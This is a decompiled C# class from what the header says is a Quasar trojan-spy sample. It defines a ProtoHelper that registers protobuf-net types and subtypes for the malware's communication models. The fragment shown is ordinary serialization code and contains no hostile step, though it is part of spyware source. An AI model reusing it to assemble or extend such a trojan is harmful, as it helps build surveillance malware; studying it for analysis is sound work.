// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Communication.ProtoHelper
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf.Meta;
using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.Communication
{
  public static class ProtoHelper
  {
    public static void PopulateTypes(Type t)
    {
      foreach (object type in RuntimeTypeModel.Default.GetTypes())
      {
        if (type is MetaType metaType && (object) metaType.Type == (object) t)
          return;
      }
      Type type1 = typeof (object);
      List<Type> typeList = new List<Type>();
      do
      {
        typeList.Insert(0, t);
        t = t.BaseType;
      }
      while ((object) t != null && (object) t != (object) type1);
      for (int index = 0; index < typeList.Count - 1; ++index)
      {
        Type type2 = typeList[index];
        MetaType metaType = (MetaType) null;
        bool flag = false;
        foreach (MetaType type3 in RuntimeTypeModel.Default?.GetTypes())
        {
          if (type3.Name.Equals(type2.Name))
          {
            flag = true;
            metaType = type3;
            break;
          }
        }
        if (!flag)
          metaType = RuntimeTypeModel.Default?.Add(type2, true);
        metaType.AddSubType((metaType.GetSubtypes().Length + 1) * 100, typeList[index + 1]);
      }
    }
  }
}
